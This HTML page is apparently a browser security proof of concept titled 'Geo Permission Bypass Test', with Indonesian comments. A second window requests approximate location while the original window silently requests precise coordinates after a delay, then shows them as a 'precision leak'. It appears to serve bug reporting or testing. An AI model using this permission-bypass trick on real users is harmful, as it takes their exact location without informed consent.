<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Geo Permission Bypass Test</title></head>
<body>
<button id="btn">Mulai Pengujian</button>
<script>
document.getElementById('btn').addEventListener('click', async () => {
    // Buka window kedua, meminta lokasi perkiraan
    const winB = window.open('', 'B', 'width=300,height=200');
    winB.document.body.innerHTML = '<h1>Meminta lokasi perkiraan...</h1>';
    winB.navigator.geolocation.getCurrentPosition(
        () => console.log('B: perkiraan berhasil'),
        (e) => console.log('B:', e.message),
        { enableHighAccuracy: false }  // perkiraan
    );
    
    // Window asli secara tersembunyi menanam permintaan presisi (ditunda)
    setTimeout(() => {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                document.body.innerHTML = `<h1 style="color:red">Kebocoran presisi: ${pos.coords.latitude}, ${pos.coords.longitude}</h1>`;
            },
            (e) => console.log('A:', e.message),
            { enableHighAccuracy: true }  // presisi
        );
    }, 500);
});
</script>
</body>
</html>
